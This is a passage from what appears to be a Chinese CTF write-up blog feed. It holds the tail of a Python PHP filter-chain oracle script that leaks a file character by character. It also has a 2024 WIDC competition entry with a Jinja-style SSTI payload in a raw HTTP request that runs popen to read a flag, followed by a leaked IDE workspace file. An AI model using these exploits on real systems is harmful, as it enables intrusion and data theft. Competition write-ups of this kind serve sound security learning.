class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># g</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;g&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># G</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;G&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># t</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;t&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># T</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;T&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>&#x27;</span><br>letter = find_letter(prefix)<br><span class="hljs-comment"># it&#x27;s a number! check base64</span><br><span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:<br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span><br>s = find_letter(prefix)<br><span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:<br><span class="hljs-comment"># 0 - 3</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:<br><span class="hljs-comment"># 4 - 7</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;4&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;5&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;7&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:<br><span class="hljs-comment"># 8 - 9</span><br>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span><br>ss = find_letter(prefix)<br><span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;8&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;9&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;wtf&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(end=letter)<br>o += letter<br>sys.stdout.flush()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">We are done!! :)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>()<br>d = b64decode(o.encode() + <span class="hljs-string">b&#x27;=&#x27;</span> * <span class="hljs-number">4</span>)<br><span class="hljs-comment"># remove KR padding</span><br>d = d.replace(<span class="hljs-string">b&#x27;$)C&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(b64decode(d))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/psctf2024/1716620538935-51aaa209-052b-498a-8c5e-1ffd5dcc768f.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024WIDC“天融信杯”信息安全挑战赛预赛</title>
    <link href="/2024/05/25/2024WIDC%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E2%80%9D%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/"/>
    <url>/2024/05/25/2024WIDC%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E2%80%9D%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h3 id="Day1-不安全的车企内网100"><a href="#Day1-不安全的车企内网100" class="headerlink" title="Day1-不安全的车企内网100"></a>Day1-不安全的车企内网100</h3><p>ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /register HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.21</span>:<span class="hljs-number">8000</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded<br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.7</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Cache-Control: <span class="hljs-built_in">max</span>-age=<span class="hljs-number">0</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">124.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Referer: http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.21</span>:<span class="hljs-number">8000</span>/<br>Origin: http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.21</span>:<span class="hljs-number">8000</span><br>Accept-Encoding: gzip, deflate<br>Content-Length: <span class="hljs-number">89</span><br><br>user=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat ./flag/flag&#x27;</span>).read()&#125;&#125;&amp;pwd=<span class="hljs-number">1323</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/widc2024/1716347433284-da157e07-636b-4593-a66a-e7c37f2943a3.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>Day1-升级认证平台100<br><a href="http://172.10.0.17:1221//.idea/workspace.xml">http://172.10.0.17:1221//.idea/workspace.xml</a><br>idea泄露出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs python">This XML file does <span class="hljs-keyword">not</span> appear to have <span class="hljs-built_in">any</span> style information associated <span class="hljs-keyword">with</span> it. The document tree <span class="hljs-keyword">is</span> shown below.<br>&lt;project version=<span class="hljs-string">&quot;4&quot;</span>&gt;<br>&lt;component name=<span class="hljs-string">&quot;ChangeListManager&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">list</span> default=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;6dbcba93-3773-47f3-a52d-67ec58f933e8&quot;</span> name=<span class="hljs-string">&quot;Default Changelist&quot;</span> comment=<span class="hljs-string">&quot;&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;EXCLUDED_CONVERTED_TO_IGNORED&quot;</span> value=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;SHOW_DIALOG&quot;</span> value=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;HIGHLIGHT_CONFLICTS&quot;</span> value=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;HIGHLIGHT_NON_ACTIVE_CHANGELIST&quot;</span> value=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;LAST_RESOLUTION&quot;</span> value=<span class="hljs-string">&quot;IGNORE&quot;</span>/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;FileEditorManager&quot;</span>&gt;<br>&lt;leaf SIDE_TABS_SIZE_LIMIT_KEY=<span class="hljs-string">&quot;300&quot;</span>&gt;<br>&lt;file pinned=<span class="hljs-string">&quot;false&quot;</span> current-<span class="hljs-keyword">in</span>-tab=<span class="hljs-string">&quot;false&quot;</span>&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/PPlab.php&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>/&gt;<br>&lt;/entry&gt;<br>&lt;/file&gt;<br>&lt;file pinned=<span class="hljs-string">&quot;false&quot;</span> current-<span class="hljs-keyword">in</span>-tab=<span class="hljs-string">&quot;false&quot;</span>&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/trueflag.php&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;34&quot;</span>&gt;<br>&lt;caret line=<span class="hljs-string">&quot;7&quot;</span> column=<span class="hljs-string">&quot;22&quot;</span> selection-start-line=<span class="hljs-string">&quot;7&quot;</span> selection-start-column=<span class="hljs-string">&quot;22&quot;</span> selection-end-line=<span class="hljs-string">&quot;7&quot;</span> selection-end-column=<span class="hljs-string">&quot;22&quot;</span>/&gt;<br>&lt;/state&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;/file&gt;<br>&lt;file pinned=<span class="hljs-string">&quot;false&quot;</span> current-<span class="hljs-keyword">in</span>-tab=<span class="hljs-string">&quot;false&quot;</span>&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/index.php&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;425&quot;</span>&gt;<br>&lt;caret line=<span class="hljs-string">&quot;30&quot;</span> column=<span class="hljs-string">&quot;14&quot;</span> selection-start-line=<span class="hljs-string">&quot;30&quot;</span> selection-start-column=<span class="hljs-string">&quot;14&quot;</span> selection-end-line=<span class="hljs-string">&quot;30&quot;</span> selection-end-column=<span class="hljs-string">&quot;14&quot;</span>/&gt;<br>&lt;/state&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;/file&gt;<br>&lt;file pinned=<span class="hljs-string">&quot;false&quot;</span> current-<span class="hljs-keyword">in</span>-tab=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/.idea/workspace.xml&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;-1887&quot;</span>/&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;/file&gt;<br>&lt;/leaf&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;ProjectFrameBounds&quot;</span> extendedState=<span class="hljs-string">&quot;6&quot;</span>&gt;<br>&lt;option name=<span class="hljs-string">&quot;x&quot;</span> value=<span class="hljs-string">&quot;348&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;y&quot;</span> value=<span class="hljs-string">&quot;80&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;width&quot;</span> value=<span class="hljs-string">&quot;1400&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;height&quot;</span> value=<span class="hljs-string">&quot;1000&quot;</span>/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;ProjectView&quot;</span>&gt;<br>&lt;navigator currentView=<span class="hljs-string">&quot;Scope&quot;</span> currentSubView=<span class="hljs-string">&quot;Scope &#x27;Project Files&#x27;; set:Project Files; class com.intellij.psi.search.scope.ProjectFilesScope&quot;</span> proportions=<span class="hljs-string">&quot;&quot;</span> version=<span class="hljs-string">&quot;1&quot;</span>&gt;<br>&lt;foldersAlwaysOnTop value=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>&lt;/navigator&gt;<br>&lt;panes&gt;<br>&lt;pane <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Scope&quot;</span>&gt;<br>&lt;subPane subId=<span class="hljs-string">&quot;Scope &#x27;Project Files&#x27;; set:Project Files; class com.intellij.psi.search.scope.ProjectFilesScope&quot;</span>&gt;<br>&lt;expand&gt;<br>&lt;path&gt;<br>&lt;item name=<span class="hljs-string">&quot;phpstorm&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;3d21c010:ScopeViewTreeModel$ProjectNode&quot;</span>/&gt;<br>&lt;item name=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;442cc68d:ScopeViewTreeModel$RootNode&quot;</span>/&gt;<br>&lt;/path&gt;<br>&lt;/expand&gt;<br>&lt;select/&gt;<br>&lt;/subPane&gt;<br>&lt;/pane&gt;<br>&lt;pane <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;ProjectPane&quot;</span>&gt;<br>&lt;subPane&gt;<br>&lt;expand&gt;<br>&lt;path&gt;<br>&lt;item name=<span class="hljs-string">&quot;phpstorm&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;b2602c69:ProjectViewProjectNode&quot;</span>/&gt;<br>&lt;item name=<span class="hljs-string">&quot;phpstorm&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;462c0819:PsiDirectoryNode&quot;</span>/&gt;<br>&lt;/path&gt;<br>&lt;path&gt;<br>&lt;item name=<span class="hljs-string">&quot;phpstorm&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;b2602c69:ProjectViewProjectNode&quot;</span>/&gt;<br>&lt;item name=<span class="hljs-string">&quot;phpstorm&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;462c0819:PsiDirectoryNode&quot;</span>/&gt;<br>&lt;item name=<span class="hljs-string">&quot;src&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;462c0819:PsiDirectoryNode&quot;</span>/&gt;<br>&lt;/path&gt;<br>&lt;/expand&gt;<br>&lt;select/&gt;<br>&lt;/subPane&gt;<br>&lt;/pane&gt;<br>&lt;/panes&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;PropertiesComponent&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">property</span> name=<span class="hljs-string">&quot;WebServerToolWindowFactoryState&quot;</span> value=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;<span class="hljs-built_in">property</span> name=<span class="hljs-string">&quot;nodejs_interpreter_path.stuck_in_default_project&quot;</span> value=<span class="hljs-string">&quot;undefined stuck path&quot;</span>/&gt;<br>&lt;<span class="hljs-built_in">property</span> name=<span class="hljs-string">&quot;nodejs_npm_path_reset_for_default_project&quot;</span> value=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;RunDashboard&quot;</span>&gt;<br>&lt;option name=<span class="hljs-string">&quot;ruleStates&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">list</span>&gt;<br>&lt;RuleState&gt;<br>&lt;option name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;ConfigurationTypeDashboardGroupingRule&quot;</span>/&gt;<br>&lt;/RuleState&gt;<br>&lt;RuleState&gt;<br>&lt;option name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;StatusDashboardGroupingRule&quot;</span>/&gt;<br>&lt;/RuleState&gt;<br>&lt;/<span class="hljs-built_in">list</span>&gt;<br>&lt;/option&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;SvnConfiguration&quot;</span>&gt;<br>&lt;configuration/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;TaskManager&quot;</span>&gt;<br>&lt;task active=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Default&quot;</span> summary=<span class="hljs-string">&quot;Default task&quot;</span>&gt;<br>&lt;changelist <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;6dbcba93-3773-47f3-a52d-67ec58f933e8&quot;</span> name=<span class="hljs-string">&quot;Default Changelist&quot;</span> comment=<span class="hljs-string">&quot;&quot;</span>/&gt;<br>&lt;created&gt;<span class="hljs-number">1553763951288</span>&lt;/created&gt;<br>&lt;option name=<span class="hljs-string">&quot;number&quot;</span> value=<span class="hljs-string">&quot;Default&quot;</span>/&gt;<br>&lt;option name=<span class="hljs-string">&quot;presentableId&quot;</span> value=<span class="hljs-string">&quot;Default&quot;</span>/&gt;<br>&lt;updated&gt;<span class="hljs-number">1553763951288</span>&lt;/updated&gt;<br>&lt;workItem <span class="hljs-keyword">from</span>=<span class="hljs-string">&quot;1553763956877&quot;</span> duration=<span class="hljs-string">&quot;42000&quot;</span>/&gt;<br>&lt;workItem <span class="hljs-keyword">from</span>=<span class="hljs-string">&quot;1553764362389&quot;</span> duration=<span class="hljs-string">&quot;33000&quot;</span>/&gt;<br>&lt;/task&gt;<br>&lt;servers/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;TimeTrackingManager&quot;</span>&gt;<br>&lt;option name=<span class="hljs-string">&quot;totallyTimeSpent&quot;</span> value=<span class="hljs-string">&quot;75000&quot;</span>/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;ToolWindowManager&quot;</span>&gt;<br>&lt;frame x=<span class="hljs-string">&quot;66&quot;</span> y=<span class="hljs-string">&quot;-11&quot;</span> width=<span class="hljs-string">&quot;1855&quot;</span> height=<span class="hljs-string">&quot;1092&quot;</span> extended-state=<span class="hljs-string">&quot;6&quot;</span>/&gt;<br>&lt;layout&gt;<br>&lt;window_info active=<span class="hljs-string">&quot;true&quot;</span> content_ui=<span class="hljs-string">&quot;combo&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Project&quot;</span> order=<span class="hljs-string">&quot;0&quot;</span> visible=<span class="hljs-string">&quot;true&quot;</span> weight=<span class="hljs-string">&quot;0.25235197&quot;</span>/&gt;<br>&lt;window_info <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Structure&quot;</span> order=<span class="hljs-string">&quot;1&quot;</span> side_tool=<span class="hljs-string">&quot;true&quot;</span> weight=<span class="hljs-string">&quot;0.25&quot;</span>/&gt;<br>&lt;window_info <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Favorites&quot;</span> order=<span class="hljs-string">&quot;2&quot;</span> side_tool=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Message&quot;</span> order=<span class="hljs-string">&quot;0&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Find&quot;</span> order=<span class="hljs-string">&quot;1&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Run&quot;</span> order=<span class="hljs-string">&quot;2&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Debug&quot;</span> order=<span class="hljs-string">&quot;3&quot;</span> weight=<span class="hljs-string">&quot;0.4&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Cvs&quot;</span> order=<span class="hljs-string">&quot;4&quot;</span> weight=<span class="hljs-string">&quot;0.25&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Inspection&quot;</span> order=<span class="hljs-string">&quot;5&quot;</span> weight=<span class="hljs-string">&quot;0.4&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;TODO&quot;</span> order=<span class="hljs-string">&quot;6&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Docker&quot;</span> order=<span class="hljs-string">&quot;7&quot;</span> show_stripe_button=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Database Changes&quot;</span> order=<span class="hljs-string">&quot;8&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Version Control&quot;</span> order=<span class="hljs-string">&quot;9&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Terminal&quot;</span> order=<span 